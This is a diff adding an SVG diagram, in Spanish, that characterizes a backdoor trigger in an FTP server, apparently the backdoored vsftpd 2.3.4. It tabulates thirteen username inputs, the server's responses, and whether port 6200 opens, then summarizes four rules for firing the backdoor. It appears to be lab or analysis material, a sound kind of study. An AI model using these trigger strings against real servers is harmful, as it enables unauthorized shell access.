@@ -1,0 +1,120 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1240 700" width="1240" height="700">
+  <style>
+    .bg{fill:#0b1120}.panel{fill:#1e293b;stroke:#334155}
+    .term{fill:#020617;stroke:#334155}
+    .ttl{fill:#f8fafc;font:700 23px 'Segoe UI',system-ui,sans-serif}
+    .sub{fill:#94a3b8;font:400 13px 'Segoe UI',system-ui,sans-serif}
+    .h{fill:#f8fafc;font:700 12.5px 'Segoe UI',system-ui,sans-serif}
+    .m{fill:#cbd5e1;font:400 12px ui-monospace,Menlo,Consolas,monospace}
+    .mm{fill:#38bdf8;font:700 12px ui-monospace,Menlo,Consolas,monospace}
+    .ok{fill:#22c55e;font:700 12px ui-monospace,Menlo,Consolas,monospace}
+    .bad{fill:#ef4444;font:700 12px ui-monospace,Menlo,Consolas,monospace}
+    .warn{fill:#f59e0b;font:400 12px ui-monospace,Menlo,Consolas,monospace}
+    .dim{fill:#64748b;font:400 12px ui-monospace,Menlo,Consolas,monospace}
+    .note{fill:#94a3b8;font:400 11.5px 'Segoe UI',system-ui,sans-serif}
+    .crit{fill:#ef4444;font:700 13px 'Segoe UI',system-ui,sans-serif}
+  </style>
+  <rect class="bg" width="1240" height="700"/>
+  <text class="ttl" x="20" y="38">Caracterización del trigger — qué abre y qué no el 6200</text>
+  <text class="sub" x="20" y="60">13 casos probados sobre el objetivo. Cada uno: USER &lt;caso&gt; seguido de PASS x</text>
+
+  <!-- cabecera de tabla -->
+  <rect class="panel" x="20" y="88" width="1200" height="30" rx="6"/>
+  <text class="h" x="34" y="108">CASO (nombre de usuario)</text>
+  <text class="h" x="250" y="108">RESPUESTA AL PASS</text>
+  <text class="h" x="470" y="108">6200</text>
+  <text class="h" x="570" y="108">INTERPRETACIÓN</text>
+
+  <!-- filas -->
+  <rect class="panel" x="20" y="124" width="1200" height="26" rx="4"/>
+  <text class="mm" x="34" y="142">backdoor:)</text>
+  <text class="warn" x="250" y="142">(sin respuesta)</text>
+  <text class="ok" x="470" y="142">ABIERTO</text>
+  <text class="note" x="570" y="142">caso de referencia</text>
+
+  <rect class="panel" x="20" y="154" width="1200" height="26" rx="4"/>
+  <text class="mm" x="34" y="172">a:)</text>
+  <text class="warn" x="250" y="172">(sin respuesta)</text>
+  <text class="ok" x="470" y="172">ABIERTO</text>
+  <text class="note" x="570" y="172">magic en el offset 1</text>
+
+  <rect class="panel" x="20" y="184" width="1200" height="26" rx="4"/>
+  <text class="mm" x="34" y="202">ab:)</text>
+  <text class="warn" x="250" y="202">(sin respuesta)</text>
+  <text class="ok" x="470" y="202">ABIERTO</text>
+  <text class="note" x="570" y="202">idéntico</text>
+
+  <rect class="panel" x="20" y="214" width="1200" height="26" rx="4"/>
+  <text class="mm" x="34" y="232">x:)y</text>
+  <text class="warn" x="250" y="232">(sin respuesta)</text>
+  <text class="ok" x="470" y="232">ABIERTO</text>
+  <text class="note" x="570" y="232">el magic no necesita estar al final</text>
+
+  <rect class="panel" x="20" y="244" width="1200" height="26" rx="4"/>
+  <text class="mm" x="34" y="262">abc:)</text>
+  <text class="warn" x="250" y="262">(sin respuesta)</text>
+  <text class="ok" x="470" y="262">ABIERTO</text>
+  <text class="note" x="570" y="262">idéntico</text>
+
+  <rect class="panel" x="20" y="278" width="1200" height="26" rx="4" fill="#2a1416" stroke="#7f1d1d"/>
+  <text class="mm" x="34" y="296">:)</text>
+  <text class="m" x="250" y="296">530 Login incorrect.</text>
+  <text class="bad" x="470" y="296">CERRADO</text>
+  <text class="note" x="570" y="296">el primer carácter es ':' → descartado antes del backdoor</text>
+
+  <rect class="panel" x="20" y="308" width="1200" height="26" rx="4" fill="#2a1416" stroke="#7f1d1d"/>
+  <text class="mm" x="34" y="326">:))</text>
+  <text class="m" x="250" y="326">530 Login incorrect.</text>
+  <text class="bad" x="470" y="326">CERRADO</text>
+  <text class="note" x="570" y="326">idéntico</text>
+
+  <rect class="panel" x="20" y="338" width="1200" height="26" rx="4" fill="#2a1416" stroke="#7f1d1d"/>
+  <text class="mm" x="34" y="356">::)</text>
+  <text class="m" x="250" y="356">530 Login incorrect.</text>
+  <text class="bad" x="470" y="356">CERRADO</text>
+  <text class="note" x="570" y="356">idéntico</text>
+
+  <rect class="panel" x="20" y="368" width="1200" height="26" rx="4" fill="#2a1416" stroke="#7f1d1d"/>
+  <text class="mm" x="34" y="386">:)x</text>
+  <text class="m" x="250" y="386">530 Login incorrect.</text>
+  <text class="bad" x="470" y="386">CERRADO</text>
+  <text class="note" x="570" y="386">idéntico</text>
+
+  <rect class="panel" x="20" y="398" width="1200" height="26" rx="4" fill="#2a1416" stroke="#7f1d1d"/>
+  <text class="mm" x="34" y="416">:)x:)</text>
+  <text class="m" x="250" y="416">530 Login incorrect.</text>
+  <text class="bad" x="470" y="416">CERRADO</text>
+  <text class="note" x="570" y="416">idéntico, aunque contenga un segundo magic válido</text>
+
+  <rect class="panel" x="20" y="428" width="1200" height="26" rx="4" fill="#2a1416" stroke="#7f1d1d"/>
+  <text class="mm" x="34" y="446">:x)</text>
+  <text class="m" x="250" y="446">530 Login incorrect.</text>
+  <text class="bad" x="470" y="446">CERRADO</text>
+  <text class="note" x="570" y="446">idéntico</text>
+
+  <rect class="panel" x="20" y="458" width="1200" height="26" rx="4" fill="#2a1416" stroke="#7f1d1d"/>
+  <text class="mm" x="34" y="476"> :)</text>
+  <text class="m" x="250" y="476">530 Login incorrect.</text>
+  <text class="bad" x="470" y="476">CERRADO</text>
+  <text class="note" x="570" y="476">el espacio inicial impide el login</text>
+
+  <rect class="panel" x="20" y="488" width="1200" height="26" rx="4" fill="#2a1416" stroke="#7f1d1d"/>
+  <text class="mm" x="34" y="506">a :)</text>
+  <text class="m" x="250" y="506">530 Login incorrect.</text>
+  <text class="bad" x="470" y="506">CERRADO</text>
+  <text class="note" x="570" y="506">el espacio corta el barrido antes del magic</text>
+
+  <rect class="panel" x="20" y="518" width="1200" height="26" rx="4" fill="#2a1416" stroke="#7f1d1d"/>
+  <text class="mm" x="34" y="536">backdoor:) SIN PASS</text>
+  <text class="dim" x="250" y="536">(no procede)</text>
+  <text class="bad" x="470" y="536">CERRADO</text>
+  <text class="note" x="570" y="536">el PASS es obligatorio</text>
+
+  <!-- reglas -->
+  <rect class="panel" x="20" y="562" width="1200" height="120" rx="10" stroke="#f59e0b" stroke-width="2"/>
+  <text class="crit" x="36" y="586" fill="#f59e0b">REGLA EMPIRICA DEL TRIGGER</text>
+  <text class="m" x="36" y="610">1.  El usuario DEBE empezar por [A-Za-z0-9_.]           → validación de handle_login() en privops.c</text>
+  <text class="m" x="36" y="630">2.  El usuario NO puede contener espacios antes de ':)'   → str_contains_space() retorna 1 en el 1er espacio</text>
+  <text class="m" x="36" y="650">3.  El usuario DEBE contener la secuencia ':)'</text>
+  <text class="m" x="36" y="670">4.  Tras el USER DEBE enviarse un PASS                    → el disparo ocurre en handle_login()</text>
+</svg>
